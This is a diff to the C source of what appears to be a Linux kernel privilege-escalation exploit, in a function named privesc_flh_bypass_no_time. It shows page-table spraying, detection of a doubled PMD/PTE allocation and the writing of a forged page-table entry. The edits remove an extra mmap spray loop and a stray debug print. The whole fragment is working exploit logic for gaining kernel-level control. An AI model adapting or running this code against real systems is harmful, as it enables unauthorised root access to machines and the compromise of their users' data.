@@ -345,11 +345,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 	// allocate overlapping PMD page (overlaps with PTE)
 	*(unsigned long long*)_pmd_area = 0xCAFEBABE;
-	void *_pmd_area1[20];
-	for (int i=4; i < 24; i++){
-		_pmd_area1[i] = mmap((void*)PTI_TO_VIRT(1, i, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-		*(unsigned long long*)_pmd_area1[i] = 0xCAFEBABA;
-	}
+
 	printf("[*] checking %d sprayed pte's for overlap...\n", CONFIG_PTE_SPRAY_AMOUNT);
 
 	// find overlapped PTE area
@@ -362,7 +358,6 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 		// if this is the double allocated PTE, the value is PFN+flags, not 0x41
 		if (*test_target_addr != 0x41)
 		{
-			printf(i);
 			printf("[+] confirmed double alloc PMD/PTE\n");
 			PRINTF_VERBOSE("    - PTE area index: %lld\n", i);
 			PRINTF_VERBOSE("    - PTE area (write target address/page): %016llx (new)\n", *test_target_addr);
@@ -376,7 +371,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 		return;
 	}
-
+	
 	// set new pte value for sanity check
 	*pte_area = 0x0 | 0x8000000000000867;
 
